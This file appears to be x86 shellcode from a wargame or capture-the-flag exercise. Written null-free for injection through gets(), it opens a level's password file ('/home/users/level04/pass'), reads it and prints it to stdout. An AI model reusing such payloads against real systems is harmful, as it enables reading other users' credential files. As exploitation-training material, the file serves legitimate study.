# init registers to 0
xor eax, eax
xor ecx, ecx
xor edx, edx

# push "/home/users/level04/pass" on stack (reverse order)
# null terminated (since gets doesn't stop at \0)
push 0x0073
push 0x7361702e
push 0x2f35306c # replace with 0x2f34306c for level04
push 0x6576656c
push 0x2f737265
push 0x73752f65
push 0x6d6f682f

# open file
mov ebx, esp # char * (on stack)
mov al, 0x5 # syscall 5 (open)
int 0x80

# read file 40 bytes
mov ebx, eax # fd as argument
xor eax, eax
mov ecx, esp # buffer just stack we don't care about messing up the stack
xor edx, edx # 0 + 28 instead of mov 28 cause of \0
add edx, 0x28
mov al, 0x3 # syscall 3 (read)
int 0x80

# write 40 (eax) bytes from buf (esp) to stdout
mov edx, eax # number to write
mov ecx, esp # buffer
xor ebx, ebx # same as before, xor for 0 then add for null bytes (cause weird issues in gdb)
add ebx, 0x1 # stdout
mov al, 0x4 # syscall 4 (write)
int 0x80

# exit(8)
xor ebx, ebx
add ebx, 0x8
mov al, 0x1 # syscall 1 (exit)
int 0x80